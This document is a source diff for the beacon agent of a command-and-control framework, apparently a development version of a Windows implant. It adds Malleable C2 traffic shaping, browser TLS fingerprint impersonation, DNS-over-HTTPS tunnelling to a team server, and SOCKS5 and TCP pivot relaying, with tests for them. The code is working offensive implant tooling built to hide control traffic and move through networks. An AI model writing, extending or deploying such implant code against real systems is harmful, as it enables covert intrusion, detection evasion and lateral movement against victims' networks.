@@ -5,7 +5,6 @@
 //! Loop:  check-in (SessionInfo)  ->  every `sleep_seconds`: send last cycle's
 //! task responses, receive this cycle's tasks, execute them.
 
-use std::io::Read;
 use std::path::{Path, PathBuf};
 use std::time::Duration;
 
@@ -14,6 +13,9 @@ use nyx_protocol::{
     encode_frame_dir, open_frame_dir, parse_frame, wire::Writer, Command, Direction, FileOp,
     ImplantKeypair, Response, SessionInfo, Task, TaskResponse,
 };
+use nyx_transport::traits::Transport as _;
+
+pub mod pivot;
 
 pub struct Config {
     /// e.g. `http://127.0.0.1:8443`
@@ -28,11 +30,223 @@ pub struct Config {
     /// Beacon endpoint path — `/beacon`, or the Malleable C2 profile's http-post
     /// `uri`. The agent POSTs the encrypted frame to `{server_url}{beacon_uri}`.
     pub beacon_uri: String,
-    /// Optional Malleable C2 profile. When set, the agent inverts the profile's
-    /// `http-post server.output` transform chain on each beacon response so it
-    /// can recover the encrypted frame the server shaped. Mirrors what the PIC
-    /// implant will do — keeps the dev loop green under a profile envelope.
+    /// Optional Malleable C2 profile. When set, the agent applies the profile's
+    /// `http-post client` envelope on each send (transform steps, static
+    /// headers, useragent) AND inverts the `server.output` envelope on each
+    /// response — the same two-sided shaping the PIC implant applies.
     pub profile: Option<nyx_profile::Profile>,
+    /// Beacon channel: HTTPS (default) or DoH DNS tunnelling (spec-2) via the
+    /// transport crate's `DohDnsTransport`, driven against the team server's
+    /// authoritative DNS responder (`/dns-query`).
+    pub channel: BeaconChannelKind,
+    /// DoH server URL (e.g. `http://127.0.0.1:8443/dns-query`) — used when
+    /// `channel == Doh`.
+    pub doh_server: String,
+    /// DoH zone domain (must match the server's `NYX_DOH_DOMAIN`) — used when
+    /// `channel == Doh`.
+    pub doh_domain: String,
+    /// Browser TLS impersonation profile for the HTTPS channel (requires the
+    /// `impersonation` feature; `None` = plain ureq client). With a profile
+    /// set, the beacon's ClientHello/HTTP2 frames match the real browser.
+    pub impersonate: Option<nyx_transport::fingerprint::BrowserProfile>,
+}
+
+/// Which beacon channel the dev agent uses.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum BeaconChannelKind {
+    /// Direct HTTPS POST to the team server (default).
+    Https,
+    /// DoH DNS tunnelling: frame chunks as TXT queries, replies polled from
+    /// `task.{domain}` (spec-2). Low-bandwidth by design.
+    Doh,
+}
+
+/// One beacon link. Owns the HTTP agent (or DoH transport) plus the profile
+/// envelopes, so shaping state survives across cycles.
+enum BeaconLink {
+    Https {
+        url: String,
+        agent: ureq::Agent,
+        client_env: nyx_profile::ClientEnvelope,
+        server_env: ServerEnvelope,
+        /// BoringSSL-backed impersonating client (feature-gated; `None` on a
+        /// build without the `impersonation` feature or without a profile).
+        #[cfg(feature = "impersonation")]
+        impersonator: Option<nyx_transport::fingerprint::ImpersonatingClient>,
+        /// Current-thread Tokio runtime driving the wreq client (wreq's
+        /// connect layer requires a live reactor).
+        #[cfg(feature = "impersonation")]
+        rt: tokio::runtime::Runtime,
+    },
+    Doh(nyx_transport::doh_dns::DohDnsTransport),
+}
+
+impl BeaconLink {
+    /// Build the link for `cfg`.
+    fn new(cfg: &Config) -> anyhow::Result<Self> {
+        let client_env = cfg
+            .profile
+            .as_ref()
+            .map(nyx_profile::post_client_envelope)
+            .unwrap_or_default();
+        let server_env = cfg
+            .profile
+            .as_ref()
+            .map(nyx_profile::post_server_envelope)
+            .unwrap_or_default();
+        match cfg.channel {
+            BeaconChannelKind::Https => {
+                #[cfg(feature = "impersonation")]
+                let impersonator = match cfg.impersonate {
+                    Some(profile) => {
+                        match nyx_transport::fingerprint::build_impersonating_client(profile) {
+                            Ok(c) => {
+                                tracing::info!(
+                                    profile = %profile.family(),
+                                    "beacon HTTPS client impersonating browser TLS"
+                                );
+                                Some(c)
+                            }
+                            Err(e) => {
+                                tracing::warn!(
+                                    error = %e,
+                                    "impersonating client build failed; falling back to plain ureq"
+                                );
+                                None
+                            }
+                        }
+                    }
+                    None => None,
+                };
+                Ok(BeaconLink::Https {
+                    url: format!("{}{}", cfg.server_url, cfg.beacon_uri),
+                    agent: ureq::AgentBuilder::new()
+                        .timeout(Duration::from_secs(30))
+                        .build(),
+                    client_env,
+                    server_env,
+                    #[cfg(feature = "impersonation")]
+                    impersonator,
+                    #[cfg(feature = "impersonation")]
+                    rt: tokio::runtime::Builder::new_current_thread()
+                        .enable_all()
+                        .build()
+                        .map_err(|e| anyhow::anyhow!("tokio runtime build failed: {e}"))?,
+                })
+            }
+            BeaconChannelKind::Doh => {
+                if cfg.doh_server.is_empty() || cfg.doh_domain.is_empty() {
+                    anyhow::bail!(
+                        "Doh channel requires doh_server (NYX_DOH_SERVER) and \
+                         doh_domain (NYX_DOH_DOMAIN)"
+                    );
+                }
+                let t = nyx_transport::doh_dns::DohDnsTransport::new(
+                    cfg.doh_domain.clone(),
+                    Some(&cfg.doh_server),
+                );
+                Ok(BeaconLink::Doh(t))
+            }
+        }
+    }
+
+    /// Full round-trip: deliver `frame`, return the raw reply frame bytes
+    /// (server envelope already inverted on the HTTPS path; DNS carries no
+    /// envelope). Blocks up to the channel's own timeout.
+    fn exchange(&mut self, frame: &[u8]) -> Result<Vec<u8>, String> {
+        match self {
+            BeaconLink::Https {
+                url,
+                agent,
+                client_env,
+                server_env,
+                #[cfg(feature = "impersonation")]
+                impersonator,
+                #[cfg(feature = "impersonation")]
+                rt,
+            } => {
+                // Client envelope: transform steps + terminator + headers + UA
+                // (mirror of implant-win/src/transport.rs). Compute the shaped
+                // body + headers once, then pick the transport (plain ureq or
+                // the impersonating BoringSSL client).
+                let (mut body, extra) = client_env.shape_body(frame);
+                let mut headers: Vec<(String, String)> = Vec::new();
+                if let Some(ua) = &client_env.useragent {
+                    if let Ok(ua) = std::str::from_utf8(ua) {
+                        headers.push(("User-Agent".to_string(), ua.to_string()));
+                    }
+                }
+                for (n, v) in &client_env.headers {
+                    let (Ok(n), Ok(v)) = (std::str::from_utf8(n), std::str::from_utf8(v)) else {
+                        continue;
+                    };
+                    headers.push((n.to_string(), v.to_string()));
+                }
+                if let Some(nyx_profile::Terminator::Header(name)) = &client_env.terminator {
+                    // The whole frame rides in a header; body stays empty.
+                    if let (Ok(name), Ok(extra)) = (
+                        std::str::from_utf8(name.as_bytes()),
+                        std::str::from_utf8(&extra),
+                    ) {
+                        headers.push((name.to_string(), extra.to_string()));
+                    }
+                    body.clear();
+                }
+                // Other terminators (print/uri-append/parameter) keep the bytes
+                // in the body — the server's beacon handler inverts whichever
+                // the profile declares.
+
+                #[cfg(feature = "impersonation")]
+                if let Some(client) = impersonator {
+                    let resp = rt
+                        .block_on(async {
+                            let mut req = client.post(url.as_str());
+                            for (n, v) in &headers {
+                                req = req.header(n.as_str(), v.as_str());
+                            }
+                            req.header("Content-Type", "application/octet-stream")
+                                .body(wreq::Body::from(body.clone()))
+                                .send()
+                                .await
+                        })
+                        .map_err(|e| format!("impersonating beacon POST failed: {e}"))?;
+                    if !resp.status().is_success() {
+                        return Err(format!(
+                            "impersonating beacon POST returned {}",
+                            resp.status()
+                        ));
+                    }
+                    let bytes = rt
+                        .block_on(resp.bytes())
+                        .map_err(|e| format!("impersonating beacon response read failed: {e}"))?;
+                    return Ok(unwrap_server_envelope(server_env, &bytes));
+                }
+
+                let mut req = agent.post(url);
+                for (n, v) in &headers {
+                    req = req.set(n, v);
+                }
+                let resp = req
+                    .send_bytes(&body)
+                    .map_err(|e| format!("beacon POST failed: {e}"))?;
+                let mut raw = Vec::new();
+                std::io::Read::read_to_end(&mut resp.into_reader(), &mut raw)
+                    .map_err(|e| format!("beacon response read failed: {e}"))?;
+                Ok(unwrap_server_envelope(server_env, &raw))
+            }
+            BeaconLink::Doh(t) => {
+                t.send(frame).map_err(|e| format!("doh send failed: {e}"))?;
+                // Reply arrives as TXT at task.{domain} within the window.
+                t.recv(15_000).map_err(|e| format!("doh recv failed: {e}"))
+            }
+        }
+    }
+
+    /// Fire-and-forget delivery (no reply needed): used for mid-cycle flushes
+    /// whose reply rides the next cycle's exchange.
+    fn post(&mut self, frame: &[u8]) -> Result<(), String> {
+        self.exchange(frame).map(|_| ())
+    }
 }
 
 pub fn run(cfg: Config) -> anyhow::Result<()> {
@@ -53,16 +267,6 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     });
     let beacon_id: u32 = rand::random();
 
-    // Resolve the server-side response envelope (the transform chain the server
-    // applies to http-post responses). When the agent has the profile it must
-    // invert these steps to recover the raw encrypted frame; without a profile
-    // the envelope is a no-op (the server returns a raw frame too).
-    let server_env: ServerEnvelope = cfg
-        .profile
-        .as_ref()
-        .map(nyx_profile::post_server_envelope)
-        .unwrap_or_default();
-
     let info = SessionInfo {
         beacon_id,
         hostname: hostname(),
@@ -74,8 +278,8 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         auth_token: None, // dev agent has no per-implant token
     };
 
-    // Beacon endpoint: `/beacon`, or the profile's http-post URI when malleable.
-    let beacon_url = format!("{}{}", cfg.server_url, cfg.beacon_uri);
+    // Beacon link: HTTPS with full profile shaping, or DoH DNS tunnelling.
+    let mut link = BeaconLink::new(&cfg)?;
 
     // ---- check-in (retry until the server accepts us) ----------------------
     let mut counter = 0u64;
@@ -92,10 +296,10 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         )
         .map_err(|e| anyhow::anyhow!("failed to seal check-in frame: {e}"))?;
         counter += 1;
-        match ureq::post(&beacon_url).send_bytes(&frame) {
+        match link.exchange(&frame) {
             Ok(_) => break,
             Err(e) => {
-                tracing::warn!(?e, "check-in failed; retrying");
+                tracing::warn!(error = %e, "check-in failed; retrying");
                 std::thread::sleep(Duration::from_secs(2));
             }
         }
@@ -106,6 +310,17 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
     let mut pending_responses: Vec<TaskResponse> = Vec::new();
     loop {
         std::thread::sleep(jitter_sleep(cfg.sleep_seconds, cfg.jitter_pct));
+
+        // Drain relay sockets (Connect/Socks channels) into the pending batch
+        // before the POST — mirrors the PIC beacon's per-cycle pump
+        // (implant-win/src/beacon.rs beacon_cycle_setup). Channel responses
+        // ride the next frame with task_id 0.
+        for r in crate::pivot::pump_channels() {
+            pending_responses.push(TaskResponse {
+                task_id: 0,
+                response: r,
+            });
+        }
 
         // `encode_batch` never fails: an oversized response blob is replaced
         // with a `Response::Err` so the batch still encodes (mirrors the PIC
@@ -124,23 +339,17 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
         // round-trip neither desyncs the sequence number nor drops undelivered
         // responses (they ride the next frame at the same counter). Mirrors
         // the mid-cycle flush paths below.
-        let resp = match ureq::post(&beacon_url).send_bytes(&frame) {
-            Ok(r) => {
+        let frame_bytes = match link.exchange(&frame) {
+            Ok(b) => {
                 counter += 1;
                 pending_responses.clear();
-                r
+                b
             }
             Err(e) => {
-                tracing::warn!(?e, "beacon POST failed");
+                tracing::warn!(error = %e, "beacon exchange failed");
                 continue;
             }
         };
-
-        let mut body = Vec::new();
-        resp.into_reader().read_to_end(&mut body)?;
-
-        // Invert the profile's server.output envelope to recover the raw frame.
-        let frame_bytes = unwrap_server_envelope(&server_env, &body);
 
         let raw = match parse_frame(&frame_bytes) {
             Ok(r) => r,
@@ -185,7 +394,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         &encode_batch(&mut pending_responses),
                     )
                     .map_err(|e| anyhow::anyhow!("failed to seal final flush frame: {e}"))?;
-                    match ureq::post(&beacon_url).send_bytes(&frame) {
+                    match link.post(&frame) {
                         // Loop exits immediately after this flush, so the
                         // counter is not advanced (dead store otherwise).
                         Ok(_) => {}
@@ -228,7 +437,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                     .map_err(|e| anyhow::anyhow!("failed to seal oversized-chunk frame: {e}"))?;
                     // 只有 POST 成功才推进 counter（失败不推进：下一帧仍用同一
                     // counter，服务端从未见过这一帧）。
-                    if let Err(e) = ureq::post(&beacon_url).send_bytes(&frame) {
+                    if let Err(e) = link.post(&frame) {
                         tracing::warn!(error = %e, "beacon send failed (oversized chunk); response dropped");
                     } else {
                         counter += 1;
@@ -259,7 +468,7 @@ pub fn run(cfg: Config) -> anyhow::Result<()> {
                         &encode_batch(&mut pending_responses),
                     )
                     .map_err(|e| anyhow::anyhow!("failed to seal batch-flush frame: {e}"))?;
-                    match ureq::post(&beacon_url).send_bytes(&frame) {
+                    match link.post(&frame) {
                         Ok(_) => {
                             counter += 1;
                             pending_responses.clear();
@@ -370,7 +579,7 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
             port,
             chan,
         } => {
-            vec![do_connect(proto, &host, port, chan)]
+            vec![crate::pivot::do_connect(proto, &host, port, chan)]
         }
         Command::Socks {
             chan,
@@ -378,17 +587,14 @@ fn execute(cmd: Command, work_dir: &Path) -> Vec<Response> {
             addr,
             port,
         } => {
-            vec![do_socks(chan, op, &addr, port)]
+            vec![crate::pivot::do_socks(chan, op, &addr, port)]
         }
-        // Relay data/close: the dev agent keeps no channel table (full
-        // bidirectional relay is implant-side), so ack as unimplemented. This
-        // keeps the wire types round-trippable end-to-end on the dev host.
-        Command::ChannelData { chan, .. } => vec![Response::Err(format!(
-            "dev agent: channel {chan} relay not implemented (implant-side)"
-        ))],
-        Command::ChannelClose { chan } => vec![Response::Err(format!(
-            "dev agent: channel {chan} relay not implemented (implant-side)"
-        ))],
+        // Relay data/close: the dev agent keeps a real channel table now
+        // (see pivot.rs — the std port of the implant's relay), so channel
+        // data flows operator → server → agent → socket and back via
+        // `pump_channels` each cycle.
+        Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
+        Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
         // Token ops are Windows-implant primitives. The dev agent can't steal/
         // make a Windows token on macOS/Linux, so those ack as implant-side;
         // GetUid runs `whoami` so the loop is verifiable end-to-end.
@@ -818,59 +1024,8 @@ fn do_fileop(op: FileOp, work_dir: &Path, path: &str, dest: Option<&str>) -> Res
     }
 }
 
-/// Open an outbound TCP connection from the implant (P2P link / reverse port
-/// forward target). On success the channel is reported open (`status: 0`) so
-/// the operator-side topology graph gets a real edge; the socket itself is
-/// dropped here — the dev beacon loop is synchronous-poll and cannot host a
-/// long-lived relay task, so bidirectional forwarding is deferred to the
-/// persistent-task refactor (see design doc §2.3). `connect_timeout` bounds
-/// the attempt so an unreachable host can't stall the whole beacon cycle.
-fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
-    use std::net::{TcpStream, ToSocketAddrs};
-    use std::time::Duration;
-    if proto != 0 {
-        return Response::Err(format!("connect: unsupported proto {proto} (only TCP=0)"));
-    }
-    // Resolve first so we can distinguish "host not found" from "host found,
-    // port closed" — connect_timeout needs a concrete SocketAddr.
-    let addr = match (host, port)
-        .to_socket_addrs()
-        .ok()
-        .and_then(|mut a| a.next())
-    {
-        Some(a) => a,
-        None => return Response::Err(format!("connect {host}:{port}: host resolution failed")),
-    };
-    match TcpStream::connect_timeout(&addr, Duration::from_secs(5)) {
-        Ok(_stream) => {
-            // Drop `_stream` deliberately: we cannot relay it in the poll loop.
-            // Reporting open lets the operator confirm reachability; the TUI
-            // draws the pivot edge. A real implant would hand the handle to a
-            // background relay task.
-            Response::Channel {
-                chan,
-                status: 0,
-                data: Vec::new(),
-            }
-        }
-        Err(e) => Response::Err(format!("connect {host}:{port}: {e}")),
-    }
-}
-
-/// SOCKS5 relay control. The dev agent does NOT implement SOCKS5 — a relay
-/// needs the same persistent-task model as Connect (a background socket loop
-/// the synchronous-poll beacon cannot host). Every opcode is answered with an
-/// explicit `Err` rather than a fake `Channel { status: 0 }` success, so the
-/// operator sees the real limitation instead of a phantom open channel.
-fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
-    // op 1 = SOCKS5 CONNECT, 2 = BIND, 3 = UDP ASSOCIATE — none are runnable
-    // in the synchronous-poll beacon loop. Report the truth for all of them.
-    let _ = (chan, addr, port);
-    Response::Err(format!(
-        "socks: op {op} not implemented on dev agent (SOCKS5 needs a persistent-task relay; use the Windows PIC implant)"
-    ))
-}
-
+/// SOCKS5 relay control is handled by `crate::pivot` (the std port of the
+/// implant's channel table): op 1 = CONNECT, op 2 = BIND, others rejected.
 /// Pack a `Vec<String>` of BOF args into the CS beacon.h wire format so a
 /// BOF's `BeaconDataParse`/`BeaconGetStr` can read them: each arg is
 /// `[u32 tag][u32 len][bytes]` (BEACON_ARG_TYPE_STRING = 3). Mirrors
@@ -1259,7 +1414,7 @@ mod tests {
     fn do_connect_rejects_non_tcp_proto() {
         // Only proto 0 (TCP) is supported; anything else must surface as an
         // error rather than attempting a connection.
-        let resp = do_connect(7, "127.0.0.1", 80, 42);
+        let resp = crate::pivot::do_connect(7, "127.0.0.1", 80, 42);
         assert!(
             matches!(resp, Response::Err(ref e) if e.contains("proto")),
             "non-TCP proto should be rejected, got: {resp:?}"
@@ -1270,7 +1425,7 @@ mod tests {
     fn do_connect_unresolvable_host_is_err() {
         // A hostname that can't resolve must come back as Err (host resolution
         // failed), not panic or hang.
-        let resp = do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
+        let resp = crate::pivot::do_connect(0, "nx-host-does-not-exist-invalid", 80, 1);
         assert!(
             matches!(resp, Response::Err(ref e) if e.contains("resolution")),
             "unresolvable host should be Err, got: {resp:?}"
@@ -1281,7 +1436,7 @@ mod tests {
     fn do_connect_closed_port_is_err() {
         // 127.0.0.1:1 is a privileged port nothing should be listening on;
         // connect must fail and we must surface it as Err within the timeout.
-        let resp = do_connect(0, "127.0.0.1", 1, 9);
+        let resp = crate::pivot::do_connect(0, "127.0.0.1", 1, 9);
         assert!(
             matches!(resp, Response::Err(_)),
             "closed port should be Err, got: {resp:?}"
@@ -1290,8 +1445,8 @@ mod tests {
 
     #[test]
     fn do_socks_rejects_unsupported_op() {
-        // op 1 (CONNECT) is the only supported opcode; bind/udp must error.
-        let resp = do_socks(5, 2, "127.0.0.1", 1080);
+        // Only op 1 (CONNECT) and op 2 (BIND) are supported.
+        let resp = crate::pivot::do_socks(5, 9, "127.0.0.1", 1080);
         assert!(
             matches!(resp, Response::Err(ref e) if e.contains("op")),
             "unsupported socks op should be Err, got: {resp:?}"
@@ -1299,14 +1454,25 @@ mod tests {
     }
 
     #[test]
-    fn do_socks_connect_op_is_err_not_fake_channel() {
-        // op 1 (CONNECT) must NOT fake a Channel{status:0} success — the dev
-        // agent cannot run a SOCKS5 relay, so it must say so explicitly.
-        let resp = do_socks(7, 1, "example.com", 443);
+    fn do_socks_connect_opens_real_channel() {
+        // op 1 (CONNECT) opens a REAL relay channel against a local listener:
+        // the socket must stay in the table so ChannelData/pump can use it.
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        // The channel table is thread-local, so this test's table is private.
+        let chan: u32 = 55;
+        let resp = crate::pivot::do_socks(chan, 1, "127.0.0.1", port);
         assert!(
-            matches!(resp, Response::Err(ref e) if e.contains("not implemented")),
-            "socks connect must be an explicit Err, got: {resp:?}"
+            matches!(resp, Response::Channel { status: 0, .. }),
+            "socks connect to a live listener must open a channel, got: {resp:?}"
         );
+        // ChannelData then flows to the listener.
+        assert_eq!(crate::pivot::channel_data(chan, b"ping"), Response::Ok);
+        let mut buf = [0u8; 4];
+        use std::io::Read as _;
+        listener.accept().unwrap().0.read_exact(&mut buf).unwrap();
+        assert_eq!(&buf, b"ping");
+        crate::pivot::channel_close(chan);
     }
 
     #[test]
